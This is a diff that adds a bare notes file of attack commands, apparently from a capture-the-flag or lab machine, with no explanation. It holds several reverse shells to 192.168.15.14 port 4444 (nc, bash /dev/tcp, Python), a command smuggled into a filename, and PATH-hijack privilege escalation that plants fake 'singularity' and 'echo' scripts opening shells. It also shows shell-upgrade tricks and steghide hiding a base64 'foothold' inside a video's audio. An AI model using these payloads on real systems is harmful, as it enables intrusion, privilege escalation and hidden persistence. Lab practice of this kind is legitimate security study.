@@ -1,0 +1,55 @@
+sh -c "echo this filename has been renamed: \$FILE"
+
+; nc 192.168.15.14 4444 -e sh #
+
+    sh -i >& /dev/tcp/192.168.15.14/4444 0>&1
+
+
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.15.14",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+
+ps aux | grep synk_daemon
+
+cd singularity
+echo '#!/bin/bash' > singularity
+echo 'bash -i >& /dev/tcp/192.168.15.14/4444 0>&1' >> singularity
+chmod +x singularity
+export PATH=/home/supernova/singularity:$PATH
+echo $PATH
+
+
+
+cat  /etc/cron.d/wda4
+
+cat /var/log/singularity.log 
+
+
+
+ su - supernova
+
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+stty raw -echo; fg
+
+
+
+cat > echo << 'EOF'
+#!/bin/bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.15.14",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+EOF
+# chmod 4777 /tmp/bash
+
+chmod +x echo
+export PATH=/tmp:$PATH
+echo $PATH
+
+ffmpeg -i rich_man_trailer.mp4 -an -c:v copy rich_man.mp4
+ffmpeg -i rich_man_trailer.mp4 -vn -acodec pcm_s16le audio.wav
+
+steghide embed -cf audio.wav -ef foothold_b64.txt -p supernovaflyingbakekang
+
+ffmpeg -i rich_man.mp4 -i audio.wav \
+    -c:v copy \
+    -c:a pcm_s16le \
+    rich_man.mkv
